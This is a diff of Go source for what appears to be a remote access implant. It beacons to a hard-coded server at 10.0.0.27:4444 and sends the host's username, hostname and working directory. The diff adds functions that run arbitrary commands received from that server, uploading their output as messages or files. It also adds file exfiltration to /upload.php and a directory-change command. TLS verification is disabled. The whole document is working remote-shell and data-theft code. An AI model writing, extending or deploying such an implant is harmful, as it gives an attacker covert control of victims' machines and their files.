@@ -4,6 +4,7 @@ import (
     "net/http"
     "net/url"
     "io"
+    "strings"
     "path/filepath"
     "path"
     "io/ioutil"
@@ -12,6 +13,7 @@ import (
     "bytes"
     "mime/multipart"
     "os"
+    "os/exec"
     "fmt"
     "crypto/tls"
     "time"
@@ -30,13 +32,6 @@ func init_settings() {
     urls := []string{"https://10.0.0.27:4444/index.php?id=1"}
     SETTINGS["urls"] = urls
     SETTINGS["url"] = urls[0]
-    /*
-    SETTINGS["urls"]=make([]string, 1)
-    SETTINGS["urls"]=append(SETTINGS["urls"].([]string), "https://10.0.0.27:4444/index.php?id=1")
-    SETTINGS["attemtps"]=3
-    SETTINGS["beacon"]=10
-    SETTINGS["debug"]=true
-    */
 }
 
 
@@ -50,24 +45,11 @@ resp, err := http.PostForm("http://example.com/form",
 */
 
 
-/*
-
-def get_target_info():
-    return {
-        "usr":getpass.getuser(),
-        "hostname":socket.gethostname(),
-        "cwd": os.getcwd(),
-        "time": time.time()
-    }
-
-
-*/
 func ignore(err error){
     if err != nil {
         fmt.Println(err)
     }
 }
-
 
 
 func postFile(filename string, targetUrl string) error {
@@ -143,6 +125,34 @@ func downloadFile(filepath string, url string) (err error) {
 }
 
 
+func execute_raw(c string, args []string) ([]byte){
+  //cmd := exec.Command("cmd", "/C", string("powershell.exe -Command Start-Process -Verb RunAs "+string(Command[1])));
+  //cmd := exec.Command(cmd_array...)
+    var cmd *exec.Cmd
+    if args == nil || len(args) == 0 {
+        cmd = exec.Command(c)
+    } else {
+        cmd = exec.Command(c, args...)
+    }
+  out, _ := cmd.CombinedOutput();
+  return out
+}
+
+func execute(c string, args []string){
+    line_cap := 100
+    out := execute_raw(c, args)
+    str_out := string(out)
+    if strings.Count(str_out, "\n") > line_cap {
+        tmp, _ := ioutil.TempFile("", "")
+        defer os.Remove(tmp.Name())
+        ioutil.WriteFile(tmp.Name(), out, 0644)
+        send_file(tmp.Name())
+    } else {
+        msg := stov(c, str_out)
+        send_msg(msg)
+    }
+}
+
 func get_beacon() url.Values {
     user, err := user.Current()
     ignore(err)
@@ -156,8 +166,19 @@ func get_beacon() url.Values {
     return url.Values{"time": {fmt.Sprint(timestamp)}, "beacon": {"True"}, "hostname":{name}, "usr":{user.Name}, "cwd":{dir}}
 }
 
-func get_args(rec []interface{}) []interface {} {
+// Convert key, value strings to url.Values
+func stov(key string, value string) url.Values {
+    return url.Values{key:{value}}
+}
 
+func send_file(filename string) {
+    u, _ := url.Parse(SETTINGS["url"].(string))
+    u.Path = "/upload.php"
+    postFile(filename, u.String())
+}
+
+//Does this actually do anything useful?
+func get_args(rec []interface{}) []interface {} {
     //rec := nil
     var j_inner []interface{}
     json.Unmarshal([]byte(rec[1].(string)), &j_inner)
@@ -166,6 +187,14 @@ func get_args(rec []interface{}) []interface {} {
         rec[1] = j_inner
     }
     return rec
+}
+
+func stringify(t []interface{} ) []string {
+    s := make([]string, len(t))
+    for i, v := range t {
+        s[i] = fmt.Sprint(v)
+    }
+    return s
 }
 
 func do_cmd(body []byte) {
@@ -184,10 +213,9 @@ func do_cmd(body []byte) {
             }
         } else if cmd == "download" {
             //rec := get_args(record.([]interface{}))
-            u, _ := url.Parse(SETTINGS["url"].(string))
-            u.Path = "/upload.php"
-            fmt.Printf("Rec: %s\n", record)
-            postFile(record.([]interface{})[0].(string), u.String())
+            for _, filename := range record.([]interface{}) {
+                send_file(filename.(string))
+            }
         } else if cmd == "upload" {
             fmt.Printf("Fulfilling cmd: Upload\n")
             //file_url := record.([]interface{})[0].(string)
@@ -204,20 +232,28 @@ func do_cmd(body []byte) {
             //rec := get_args(record.([]interface{}))
             fmt.Printf("Rec: %s\n", record)
             downloadFile(filename, file_url)
-        } else {
-            fmt.Printf("CMD:%s no supported!", cmd)
+        } else if cmd == "cd" {
+            dir := record.([]interface{})[0].(string)
+            fmt.Printf("Changing Dir: %s \n", fmt.Sprint(dir) )
+            err := os.Chdir(dir)
+            if err != nil {
+                fmt.Printf("Err: %s \n", err)
+            }
+        //} else if cmd == "execute" {
+        } else { //assume execute
+            //rec := get_args(record.([]interface{}))
+            fmt.Printf("Rec: %s\n", record)
+            //rec := get_args(record.([]interface{}))
+            cmd_array := stringify(record.([]interface{}))
+            if cmd == "execute" {
+                go execute(cmd_array[0], cmd_array[1:])
+            } else {
+                go execute(cmd, cmd_array)
+            }
         }
-        
+       
+ 
     }
-    /* 
-    if cmd, ok := j["set"].(map[string]interface{}); ok {
-        fmt.Printf("%s\n", cmd)
-        for k, v := range cmd {
-        }
-    } else {
-        fmt.Printf("%s had no work\n", j)
-    }
-    */
 }
 
 func atoi(s string) int{
@@ -229,6 +265,32 @@ func sleep(sec int){
     time.Sleep(time.Duration(sec)*time.Second)
 }
 
+func send_msg(m url.Values) []byte{
+    err_count := 0
+    attempts:= atoi(SETTINGS["attempts"].(string))
+    for err_count <= attempts {
+        fmt.Printf("%d attempts remaining\n", attempts - err_count)
+        //urls := SETTINGS["urls"].([]string)
+        //fmt.Printf("URL: %v\n", urls )
+        //fmt.Printf("URL: %s\n", urls[0] )
+        //resp, err := http.PostForm((SETTINGS["urls"].([]string))[0], b)
+        resp, err := http.PostForm(SETTINGS["url"].(string), m)
+        if err != nil {
+            fmt.Println(err)
+            err_count++
+            time.Sleep(time.Second)
+        } else {
+            fmt.Println(resp)
+            bodyBytes, _ := ioutil.ReadAll(resp.Body)
+            //fmt.Printf("Body:%s\n", string(bodyBytes))
+            //do_cmd(bodyBytes)
+            return bodyBytes
+        }
+        break
+    }
+    return nil
+}
+
 func main() {
     init_settings()
     http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
@@ -236,28 +298,9 @@ func main() {
         //url = "https://10.0.0.27:4444/index.php"
         //resp, err := http.Get("https://10.0.0.27:4444") 
         b := get_beacon()
-        err_count := 0
-        attempts:= atoi(SETTINGS["attempts"].(string))
-        for err_count <= attempts {
-            fmt.Printf("%d attempts remaining\n", attempts - err_count)
-            //urls := SETTINGS["urls"].([]string)
-            //fmt.Printf("URL: %v\n", urls )
-            //fmt.Printf("URL: %s\n", urls[0] )
-            //resp, err := http.PostForm((SETTINGS["urls"].([]string))[0], b)
-            resp, err := http.PostForm(SETTINGS["url"].(string), b)
-            if err != nil {
-                fmt.Println(err)
-                err_count++
-                time.Sleep(time.Second)
-            } else {
-                fmt.Println("hello world")
-                fmt.Println(resp)
-                bodyBytes, _ := ioutil.ReadAll(resp.Body)
-                fmt.Printf("Body:%s\n", string(bodyBytes))
-                do_cmd(bodyBytes)
-            }
-            break
-        }
+        cmd := send_msg(b)
+        do_cmd(cmd)
+
         sleep(atoi(SETTINGS["beacon"].(string)))
     }
 }
